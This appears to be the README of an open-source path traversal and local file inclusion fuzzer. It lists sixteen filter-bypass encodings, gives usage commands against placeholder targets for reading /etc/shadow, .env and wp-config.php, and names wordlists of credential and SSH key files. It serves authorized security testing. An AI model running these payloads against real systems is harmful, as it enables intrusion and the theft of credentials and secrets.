# Liffier

Path traversal / LFI fuzzer with 16 encoding bypass techniques, automatic response analysis, concurrent requests, and proxy support (Burp/Caido).

## Why

Testing for path traversal means trying dozens of encoding variants at multiple depths against multiple files. Doing it manually is slow. Liffier generates all combinations, fires them concurrently, and tells you which ones actually worked - with confidence levels based on response content analysis, not just status codes.

## Features

- **16 encoding techniques** - plain, URL-encoded, double-encoded, overlong UTF-8, backslash, mixed, null-byte, and more
- **Automatic hit detection** - analyzes response content for file signatures (passwd entries, ini sections, env vars), compares against baseline, flags anomalies
- **Concurrent requests** - configurable thread pool
- **Proxy support** - route through Burp Suite or Caido
- **Bypass suffixes** - null bytes, extension tricks for PHP/Java include bypasses
- **Multiple output modes** - rich tables, quiet mode, JSON/JSONL/CSV export
- **Payload generation** - dump payloads to stdout for ffuf, Burp Intruder, etc.
- **Wordlists included** - Linux, Windows, and webapp config file targets

## Install

```bash
pip install git+https://github.com/momenbasel/liffier.git
```

Or clone:

```bash
git clone https://github.com/momenbasel/liffier.git
cd liffier
pip install -e .
```

## Usage

### Basic fuzzing

```bash
# Fuzz a parameter for /etc/passwd with all encodings
liffier fuzz "https://target.com/page?file="

# Target a specific file
liffier fuzz "https://target.com/page?file=" --file /etc/shadow

# Limit depth and use specific encodings
liffier fuzz "https://target.com/page?file=" --depth 15 -e plain -e url-encoded -e double-url
```

### With proxy (Burp/Caido)

```bash
liffier fuzz "https://target.com/page?file=" --proxy http://127.0.0.1:8080
```

### Authenticated testing

```bash
liffier fuzz "https://target.com/page?file=" \
    -c "session=abc123; token=xyz" \
    -H "Authorization: Bearer eyJ..."
```

### Enable bypass suffixes (null bytes, extension tricks)

```bash
liffier fuzz "https://target.com/include.php?path=" --bypass
```

### Quick scan (multiple common files)

```bash
# Tests passwd, shadow, hosts, environ, win.ini, .env, etc.
liffier scan "https://target.com/page?file="

# Custom file list
liffier scan "https://target.com/page?file=" -f /etc/passwd -f .env -f wp-config.php
```

### Generate payloads for other tools

```bash
# Pipe to ffuf
liffier payloads -f /etc/passwd | ffuf -u "https://target.com/page?file=FUZZ" -w -

# Pipe to Burp Intruder (via file)
liffier payloads -f /etc/passwd --bypass > payloads.txt

# With specific encodings only
liffier payloads -e url-encoded -e double-url -f /etc/shadow
```

### List available encodings

```bash
liffier encodings
```

### Tuning

```bash
# 20 threads, 15s timeout, 0.1s delay between requests
liffier fuzz "https://target.com/page?file=" -w 20 -t 15 --delay 0.1

# Only show hits
liffier fuzz "https://target.com/page?file=" --hits-only

# Quiet mode (one line per hit, no tables)
liffier fuzz "https://target.com/page?file=" --quiet

# Export results
liffier fuzz "https://target.com/page?file=" -o results.json
liffier fuzz "https://target.com/page?file=" -o results.csv --format csv
```

## Encoding Techniques

| Name | Sequence | Notes |
|---|---|---|
| plain | `../` | Standard traversal |
| url-encoded | `..%2f` | Bypasses basic string filters |
| url-encoded-full | `%2e%2e%2f` | Full URL encoding |
| double-url | `..%252f` | Bypasses single-decode filters |
| double-url-full | `%252e%252e%252f` | Full double encoding |
| backslash | `..\` | Windows paths |
| url-backslash | `..%5c` | URL-encoded backslash |
| dot-overlong-utf8 | `..%c0%af` | Overlong UTF-8 slash |
| dot-overlong-utf8-2 | `%c0%ae%c0%ae%c0%af` | Full overlong dots + slash |
| dot-overlong-utf8-3 | `..%ef%bc%8f` | Fullwidth solidus |
| mixed-slash | `..\/` | Mixed separator |
| double-dot-variation | `....//` | Filter evasion |
| triple-dot | `.../.../` | Alternate pattern |
| null-byte-suffix | `../%00` | Null byte injection |
| url-encoded-backslash-full | `%2e%2e%5c` | Full encoded backslash |
| utf8-dot | (two-dot leader)/  | Unicode dot variant |

## Detection

Liffier doesn't just check status codes. It:

1. Fetches a baseline response (known-bad request) for length comparison
2. Checks response body for file-specific signatures (e.g. `root:x:0:0:` for passwd)
3. Detects error pages via pattern matching
4. Compares response length against baseline for anomaly detection
5. Assigns confidence levels: **HIGH** (signature match), **MEDIUM** (structural match), **LOW** (length anomaly)

## Wordlists

Included in `wordlists/`:

- `linux.txt` - /etc/passwd, /proc/*, logs, SSH keys, configs
- `windows.txt` - win.ini, SAM, SYSTEM, IIS configs, xampp
- `webapp.txt` - .env, wp-config.php, web.xml, .git/config, composer.json

## License

MIT

## Disclaimer

For authorized security testing and research only.
